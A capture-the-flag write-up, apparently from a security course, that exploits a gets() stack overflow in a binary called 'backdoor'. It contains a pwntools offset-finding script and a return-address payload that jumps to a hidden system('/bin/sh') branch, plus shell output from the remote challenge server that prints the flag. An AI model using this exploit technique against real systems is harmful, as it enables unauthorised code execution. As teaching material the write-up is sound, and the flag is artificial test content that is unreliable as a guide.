Writeup for [[Backdoor]]
Location: ``nc offsec-chalbroker.osiris.cyber.nyu.edu 1339``
Download: `backdoor`
Lore: Jumping
Flag: `flag{y0u_dont_n33d_t0_jump_t0_th3_b3ginning_of_functi0ns}`

###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ./backdoor    
I patched out all my old bugs, so I know my code is super-secure! Tell me your name, friend:
Nobody
You can't hack me, Nobody
```

###### Code:
```c
undefined8 main(EVP_PKEY_CTX *param_1)
{
  char data [32];
  
  init(param_1);
  puts(
      "I patched out all my old bugs, so I know my code is super-secure! Tell me your name, friend:"
      );
  gets(data);
  printf("You can\'t hack me, %s\n",data);
  return 0;
}
```

##### Checksec:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ pwn checksec backdoor                      
[*] '/home/kali/Desktop/5-Week/backdoor'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Nothing super exciting in vmmap tbh

Spam with data to see what happens:
(I will put the python in this one but not in school so it's in here once)
###### Where is our segfault:
```python
def ripOffset():
	p = process('./backdoor')
	d = p.recvuntil("friend:")
	p.sendline(cyclic(100))
	p.wait()
	cf = p.corefile
	stack = cf.rsp
	info("rsp = %#x", stack)
	pattern = cf.read(stack, 4)
	ripOffset = cyclic_find(pattern)
	info("rip offset = %d", ripOffset)
```
###### Results:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 Backdoor_Pwn1.py                   
[+] Starting local process './backdoor': pid 1437485
/home/kali/Desktop/5-Week/Backdoor_Pwn1.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  d = p.recvuntil("friend:")
[*] Process './backdoor' stopped with exit code -11 (SIGSEGV) (pid 1437485)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/5-Week/core.1437485'
    Arch:      amd64-64-little
    RIP:       0x40073c
    RSP:       0x7fff509ad318
    Exe:       '/home/kali/Desktop/5-Week/backdoor' (0x400000)
    Fault:     0x6161616c6161616b
[*] rsp = 0x7fff509ad318
[*] rip offset = 40
```

Some leak into registers:
```
$rax   : 0x0               
$rbx   : 0x00007fffffffded8  →  0x00007fffffffe24a  →  "/home/kali/Desktop/5-Week/backdoor"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffddc8  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00007fffffffdbf0  →  "You can't hack me, aaaabaaacaaadaaaeaaafaaagaaahaa[...]"
$rdi   : 0x00007fffffffdbc0  →  0x00007fffffffdbf0  →  "You can't hack me, aaaabaaacaaadaaaeaaafaaagaaahaa[...]"
$rip   : 0x000000000040073c  →  <main+68> ret 
```
Overwrote `rbp` ...will that be a problem?

And can see in the stack:
```
0x00007fffffffddc8│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"    ← $rsp
0x00007fffffffddd0│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
...omitted for brevity...
```
##### Found offsets
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3                 
>>> from pwn import *
>>> cyclic_find("kaaa")
40
>>> cyclic_find("iaaa")
32
```

So the data at 32 gets written into `rbp`, and at 40 it gets popped off of the stack with the `ret`.
So if we can put an address there, it should execute

#### Building a Payload
Now, Backdoor has an unused function called `get_time
![[Pasted image 20240305230642.png]]
We see it uses system, which it imported:
![[Pasted image 20240306113928.png]]

It makes a system call, but with a command that won't help us:
```c
/* WARNING: Removing unreachable block (ram,0x004006bb) */
void get_time(void)
{
  system("/bin/date");
  return;
}
```
However, and that warning should be a clue, there's more than meets the eye

Looking at the assembly, we do see that the code at  `004006bb` is unreachable because of the `CMP`
```
Dump of assembler code for function get_time:
   0x000000000040069d <+0>:     push   rbp
   0x000000000040069e <+1>:     mov    rbp,rsp
   0x00000000004006a1 <+4>:     push   rbx
   0x00000000004006a2 <+5>:     sub    rsp,0x18
   0x00000000004006a6 <+9>:     mov    ebx,0x4007c8                    = "/bin/date"
   0x00000000004006ab <+14>:    mov    DWORD PTR [rbp-0x14],0xdead
   0x00000000004006b2 <+21>:    cmp    DWORD PTR [rbp-0x14],0x1337
   0x00000000004006b9 <+28>:    jne    0x4006c0 <get_time+35>
   0x00000000004006bb <+30>:    mov    ebx,0x4007d2                    = "/bin/sh"
   0x00000000004006c0 <+35>:    mov    rdi,rbx
   0x00000000004006c3 <+38>:    mov    eax,0x0
   0x00000000004006c8 <+43>:    call   0x400550 <system@plt>
   0x00000000004006cd <+48>:    add    rsp,0x18
   0x00000000004006d1 <+52>:    pop    rbx
   0x00000000004006d2 <+53>:    pop    rbp
   0x00000000004006d3 <+54>:    ret
```
After saving the command `"/bin/date"` in `ebx`, the program compares two different strings before jumping when they are not equal. However, if the jump operation didn't happen, the line at `0x4006bb` would overwrite `ebx` with `/bin/sh`.
If we push `0x4006bb` to the top of the stack before `main` returns, the program should run this portion of `get_time` and give us a shell:
```
0x00000000004006bb <+30>:    mov    ebx,0x4007d2                    = "/bin/sh"
0x00000000004006c0 <+35>:    mov    rdi,rbx
0x00000000004006c3 <+38>:    mov    eax,0x0
0x00000000004006c8 <+43>:    call   0x400550 <system@plt>
0x00000000004006cd <+48>:    add    rsp,0x18
0x00000000004006d1 <+52>:    pop    rbx
0x00000000004006d2 <+53>:    pop    rbp
0x00000000004006d3 <+54>:    ret
```

We might run into stack issues because we're jumping into the middle of the function instead of the beginning (where rbp is pushed), but we also are overwriting `rsp` with a bunch of junk so...lets just see what happens?

With that, we can build our payload
```python
def pld():
	pad = b'A'*40
	addr = p64(0x00004006bb)
	return pad + addr
```

## Remote Exploitation
Connect to the remote service and send the payload using script.
Results:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 Backdoor_Pwn1.py
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1339: Done
[*] Switching to interactive mode
You can't hack me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbb\x06@
$ whoami
pwn
$ ls
backdoor
flag.txt
$ cat flag.txt
flag{y0u_dont_n33d_t0_jump_t0_th3_b3ginning_of_functi0ns}
```

Full code is in appendix